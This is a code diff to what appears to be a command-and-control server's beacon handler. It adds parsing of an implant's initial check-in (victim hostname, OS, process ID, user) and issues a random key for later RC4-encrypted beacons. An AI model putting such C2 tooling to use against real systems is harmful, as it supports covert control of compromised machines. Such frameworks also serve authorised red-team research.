@@ -67,7 +67,25 @@ def beacon_response():
         # if initial Base64 beacon
         # new beacon
         if is_base64(raw_data) is True:
-            return "initial beacon"
+            # Base64 decodes POST data
+            decoded = base64.b64decode(raw_data).decode()
+
+            # parses JSON POST data
+            j = json.loads(decoded)
+            hostname = j["h"]
+            operating_system = j["o"]
+            process_id = j["p"]
+            current_user = j["u"]
+
+            # generates a random 32 character encryption key (upper and lower, no numbers)
+            encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters) for _ in range(32))
+
+            # gets current time (uses server's time)
+            now = datetime.datetime.now()
+            time = now.strftime("%Y-%m-%d %H:%M:%S")
+
+            # returns Base64 encoded encryption key in the HTTP response
+            return base64.b64encode(encryption_key.encode())
 
         else:
             return "rc4 beacon"
